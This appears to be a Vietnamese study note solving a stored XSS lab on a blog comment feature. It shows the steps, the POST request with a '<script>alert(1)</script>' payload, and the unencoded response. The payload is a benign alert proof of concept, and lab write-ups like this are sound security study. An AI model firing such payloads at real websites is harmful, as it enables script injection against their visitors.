![[stored-basic.png]]
lab comment lưu payload lại, ai mở bài viết cũng dính alert.

> [!NOTE] phân tích đề
> - đề cho chức năng comment ở blog.
> - entry point là form comment, exit point là trang hiển thị comment.
> - input không hiện ngay, nó lưu DB rồi mới hiện sau.
> - nên mình phải submit xong rồi load lại / chờ bot vào xem.
> - đọc thêm [[lys thuyet XSS]] + [[stored xss]].

### hướng giải
- [ ] nhập chuỗi random `x7Kp92Qa` vào comment -> submit.
- [ ] load lại trang, tìm chuỗi đó ở response sau.
- [ ] xác định context -> HTML text, không encode.
- [ ] bắn payload script -> load lại -> check alert.

### giải
request:
```http
POST /post/comment HTTP/1.1

comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&name=mình&email=a%40a.com
```

payload:
```html
<script>alert(1)</script>
```

response khi nạn nhân / bot mở bài viết:
```html
<p><script>alert(1)</script></p>
```

kết quả:
-> alert(1) hiện khi mở trang chứa comment.
![[stored-basic-result.png]]

> [!NOTE] bài học
> - sau khi quan sát lab này mình thấy... stored khác reflected đúng 1 điểm: nó lưu lại.
> => nên mình tìm stored thì phải tách entry và exit ra, đừng nhìn response ngay sau POST rồi kết luận không có lỗi.
